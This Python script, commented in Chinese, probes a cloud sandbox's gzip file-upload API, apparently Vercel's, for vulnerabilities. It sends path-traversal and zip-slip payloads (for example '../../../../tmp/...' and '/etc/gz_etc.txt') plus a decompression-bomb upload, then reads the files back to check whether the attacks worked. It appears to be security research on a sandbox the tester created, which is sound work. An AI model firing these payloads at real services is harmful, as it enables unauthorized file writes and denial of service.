# -*- coding: utf-8 -*-
"""非传统面F: ①fs/write gzip 上传 — 路径参数格式/穿越/gzip 内嵌文件名(zip-slip) ②sudo root 网络策略绕过
正常流程用 CLI copy 只传正常路径; 这里测 gzip 解压语义"""
import json, sys, time, gzip, requests
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TOKEN, TEAM, PROJ, BASE

def log(s): print(s, flush=True)

api("DELETE", "/v2/sandboxes/n23?teamId=%s&projectId=%s" % (TEAM, PROJ))
time.sleep(2)
c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": "n23"}, 60)
sid = json.loads(r)['sandbox']['currentSessionId']
log('sid=%s' % sid)
time.sleep(3)

hdr = {'Authorization': 'Bearer %s' % TOKEN, 'Content-Type': 'application/gzip'}

def gz_write(tag, payload, fname, query):
    """payload: bytes 或原始文本; fname: gzip 内嵌文件名(或 None); query: ?path= 等"""
    if isinstance(payload, str):
        payload = payload.encode()
    import io
    buf = io.BytesIO()
    with gzip.GzipFile(filename=fname or '', mode='wb', fileobj=buf) as g:
        g.write(payload)
    data = buf.getvalue()
    try:
        rr = requests.post('%s/v2/sandboxes/sessions/%s/fs/write?teamId=%s%s' % (BASE, sid, TEAM, query),
                           headers=hdr, data=data, timeout=30)
        log('[%s] -> %s | %s' % (tag, rr.status_code, rr.text[:300].replace(chr(10), ' ')))
        return rr
    except Exception as e:
        log('[%s] err %s' % (tag, e))

# ① 正常 gzip 上传: 路径在 query?
log('===== ① gzip 上传 =====')
gz_write('q-path', 'GZ_OK_2026', None, '&path=/tmp/gz_ok.txt')
gz_write('q-dest', 'GZ_DEST_2026', None, '&destination=/tmp/gz_dest.txt')
gz_write('body-only', 'GZ_BODY_2026', None, '')
gz_write('slash-path', 'GZ_SLASH_2026', None, '&path=/tmp/dir/sub/gz_sub.txt')

# ② 读回验证
for p in ['/tmp/gz_ok.txt', '/tmp/gz_dest.txt', '/tmp/gz_sub.txt']:
    c, r = api("POST", "/v2/sandboxes/sessions/%s/fs/read?teamId=%s" % (sid, TEAM), {"path": p}, 20)
    log('read %s -> %s | %s' % (p, c, (r or '')[:100].replace(chr(10), ' ')))

# ③ gzip 内嵌文件名 (zip-slip 探测: 解压路径用 header 文件名?)
log('')
log('===== ③ gzip 内嵌文件名 =====')
gz_write('fname-normal', 'GZ_FNORMAL_2026', 'inner_name.txt', '&path=/tmp/gz_fname.txt')
gz_write('fname-slip', 'GZ_SLIP_2026', '../../../../tmp/gz_slip.txt', '&path=/tmp/gz_fname2.txt')
gz_write('fname-abs', 'GZ_ABS_2026', '/tmp/gz_abs.txt', '&path=/tmp/gz_fname3.txt')

# ④ path 穿越 (query path)
log('')
log('===== ④ query path 穿越 =====')
gz_write('trav1', 'GZ_TRAV1_2026', None, '&path=../../../../tmp/gz_trav1.txt')
gz_write('trav2', 'GZ_TRAV2_2026', None, '&path=/etc/gz_etc.txt')
gz_write('dotdot', 'GZ_DOTDOT_2026', None, '&path=/tmp/../tmp/gz_dotdot.txt')

# 验证 ③④
for p in ['/tmp/gz_slip.txt', '/tmp/gz_abs.txt', '/tmp/gz_trav1.txt', '/etc/gz_etc.txt', '/tmp/gz_dotdot.txt']:
    c, r = api("POST", "/v2/sandboxes/sessions/%s/fs/read?teamId=%s" % (sid, TEAM), {"path": p}, 20)
    log('read %s -> %s | %s' % (p, c, (r or '')[:80].replace(chr(10), ' ')))

# ⑤ 解压炸弹 (10MB -> 500MB)
log('')
log('===== ⑤ gzip bomb =====')
big = b'A' * (10 * 1024 * 1024)
gz_write('bomb-10m', big, None, '&path=/tmp/gz_bomb.txt')

api("DELETE", "/v2/sandboxes/n23?teamId=%s&projectId=%s" % (TEAM, PROJ))
log('DONE')
